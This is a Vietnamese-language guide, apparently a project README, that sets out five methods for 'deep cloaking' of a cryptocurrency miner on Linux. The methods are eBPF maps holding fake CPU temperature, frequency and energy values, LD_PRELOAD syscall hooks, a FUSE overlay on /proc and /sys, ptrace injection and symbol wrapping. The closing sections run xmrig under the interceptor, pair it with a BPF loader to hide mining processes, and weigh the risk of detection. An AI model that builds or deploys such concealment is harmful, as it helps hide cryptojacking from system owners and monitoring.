# 🛡️ Enhanced Cloaking Guide - Thay thế `bpf_probe_write_user`

## 📋 **Tổng quan**

Đây là **5 phương án thay thế** `bpf_probe_write_user` để tăng khả năng **deep cloaking** mà vẫn đảm bảo tính **an toàn** và **tương thích** với kernel hiện đại.

## 🔧 **Phương án 1: BPF Maps-Based Cloaking**

### **Nguyên lý**
- Thay vì ghi trực tiếp vào **user memory**, lưu **fake values** vào **BPF maps**
- **Userspace interceptor** đọc từ maps và thay thế giá trị khi cần

### **Implementation**
```bash
# 1. Biên dịch với enhanced maps
make clean && make all

# 2. Load BPF program với maps mới
sudo ./obj/attach_throttle -v

# 3. Sử dụng interceptor
export LD_PRELOAD=./obj/libcloaking_interceptor.so
export CLOAKING_DEBUG=1
```

### **Maps được thêm**
- `fake_msr_map`: Fake MSR register values
- `fake_sched_attr_map`: Fake scheduler attributes
- `fake_rdt_map`: Fake Intel RDT counters
- `fake_rapl_map`: Fake RAPL energy values
- `interception_tracker`: Track interception requests

## 🔧 **Phương án 2: LD_PRELOAD Syscall Interception**

### **Nguyên lý**
- **Hook system calls** trước khi chúng đến kernel
- Thay thế **return values** với fake data từ BPF maps

### **Syscalls được intercept**
- `syscall()`: MSR reads qua `/dev/cpu/*/msr`
- `sched_setattr()`: Scheduler attribute modification
- `fopen()`: Procfs/sysfs file access
- `open()`: Device file access

### **Usage**
```bash
# Chạy application với interceptor
LD_PRELOAD=./obj/libcloaking_interceptor.so ./target_application

# Debug mode
CLOAKING_DEBUG=1 LD_PRELOAD=./obj/libcloaking_interceptor.so ./target_application
```

## 🔧 **Phương án 3: FUSE Filesystem Overlay**

### **Nguyên lý**
- Tạo **virtual filesystem** overlay cho `/proc` và `/sys`
- **Filter và modify** nội dung files trước khi trả về applications

### **Implementation**
```bash
# Tạo FUSE overlay (cần thêm code)
mkdir -p /tmp/fake_proc /tmp/fake_sys
sudo fusectl mount /tmp/fake_proc
sudo fusectl mount /tmp/fake_sys

# Mount overlay
sudo mount -t overlay overlay \
  -o lowerdir=/proc,upperdir=/tmp/fake_proc,workdir=/tmp/work_proc \
  /proc_overlay
```

### **Files được override**
- `/proc/cpuinfo`: Fake CPU information
- `/sys/class/thermal/*/temp`: Fake temperature
- `/sys/class/hwmon/*/temp*_input`: Fake sensor readings
- `/sys/devices/system/cpu/*/cpufreq/`: Fake frequency info

## 🔧 **Phương án 4: Ptrace-based Runtime Manipulation**

### **Nguyên lý**
- **Attach** vào target processes bằng `ptrace`
- **Modify memory** và **registers** tại runtime
- **Inject fake values** vào syscall parameters

### **Features**
- Real-time syscall parameter modification
- Memory content replacement
- Register manipulation
- Dynamic code injection

### **Usage**
```bash
# Monitor thread tự động xử lý từ BPF events
# Không cần intervention thủ công
```

## 🔧 **Phương án 5: Library Symbol Replacement**

### **Nguyên lý**
- **Replace symbols** trong shared libraries
- **Wrapper functions** around system calls
- **Dynamic linking** với fake implementations

### **Implementation**
```c
// Override libc functions
int __real_sched_setattr(pid_t pid, const struct sched_attr *attr, unsigned int flags);
int __wrap_sched_setattr(pid_t pid, const struct sched_attr *attr, unsigned int flags) {
    // Apply cloaking logic here
    return __real_sched_setattr(pid, modified_attr, flags);
}
```

## 📊 **So sánh Hiệu quả**

| **Phương án** | **Deep Cloaking** | **Performance** | **Compatibility** | **Security** |
|---------------|-------------------|-----------------|-------------------|--------------|
| **BPF Maps** | 🟢 Cao | 🟢 Cao | 🟢 Cao | 🟢 An toàn |
| **LD_PRELOAD** | 🟡 Trung bình | 🟡 Trung bình | 🟢 Cao | 🟢 An toàn |
| **FUSE Overlay** | 🟢 Cao | 🔴 Thấp | 🟡 Trung bình | 🟢 An toàn |
| **Ptrace** | 🟢 Rất cao | 🔴 Thấp | 🔴 Thấp | ⚠️ Nguy hiểm |
| **Symbol Replace** | 🟡 Trung bình | 🟢 Cao | 🟡 Trung bình | 🟢 An toàn |

## 🎯 **Chiến lược Tối ưu**

### **Recommended Combination**
```bash
# 1. Primary: BPF Maps + LD_PRELOAD
export LD_PRELOAD=./obj/libcloaking_interceptor.so
sudo ./obj/attach_throttle -v

# 2. Secondary: FUSE cho deep filesystem cloaking
# (implement khi cần mức độ che giấu cao hơn)

# 3. Fallback: Ptrace cho extreme cases
# (chỉ dùng khi các phương án khác không đủ)
```

### **Configuration**
```bash
# Cấu hình cloaking strategy
./obj/throttle_ctl cloak adaptive --temp 50000 --util 40 --freq 2000000

# Enable debug để monitor
export CLOAKING_DEBUG=1

# Test với mining application
LD_PRELOAD=./obj/libcloaking_interceptor.so xmrig --config=config.json
```

## 🔍 **Testing & Validation**

### **Test MSR Cloaking**
```bash
# Test temperature reading
LD_PRELOAD=./obj/libcloaking_interceptor.so sensors

# Test frequency reading  
LD_PRELOAD=./obj/libcloaking_interceptor.so cpufreq-info
```

### **Test Scheduler Cloaking**
```bash
# Test util_clamp modification
LD_PRELOAD=./obj/libcloaking_interceptor.so \
  chrt -u 50 stress-ng --cpu 4 --timeout 30s
```

### **Verify BPF Maps**
```bash
# Check fake values in maps
bpftool map dump pinned /sys/fs/bpf/cpu_throttle/fake_msr_map
bpftool map dump pinned /sys/fs/bpf/cpu_throttle/fake_sched_attr_map
```

## ⚠️ **Lưu ý Quan trọng**

### **Security Considerations**
1. **Kernel compatibility**: Tested trên kernel 6.8+
2. **Permission requirements**: Cần `CAP_SYS_PTRACE` cho ptrace method
3. **Detection risks**: Advanced monitoring có thể phát hiện LD_PRELOAD

### **Performance Impact**
1. **BPF Maps**: ~1-2% overhead
2. **LD_PRELOAD**: ~3-5% overhead  
3. **FUSE**: ~10-15% overhead
4. **Ptrace**: ~20-30% overhead

### **Best Practices**
1. **Start simple**: Dùng BPF Maps + LD_PRELOAD trước
2. **Monitor effectiveness**: Check logs và detection attempts
3. **Adaptive strategy**: Tự động chuyển đổi methods khi cần
4. **Cleanup**: Luôn unload BPF programs và cleanup resources

## 📚 **Advanced Usage**

### **Custom Interceptor**
```c
// Extend enhanced_cloaking_interceptor.c
// Add custom syscall interception logic
```

### **Dynamic Configuration**
```bash
# Runtime cloaking configuration changes
echo "target_temp=45000" > /sys/fs/bpf/cpu_throttle/config
echo "strategy=adaptive" > /sys/fs/bpf/cpu_throttle/config
```

### **Integration với Hide Process**
```bash
# Kết hợp với hide_process_bpf để ẩn mining processes
sudo ./hide_process_bpf/output/hide_process_loader --pin-maps &
LD_PRELOAD=./obj/libcloaking_interceptor.so xmrig
``` 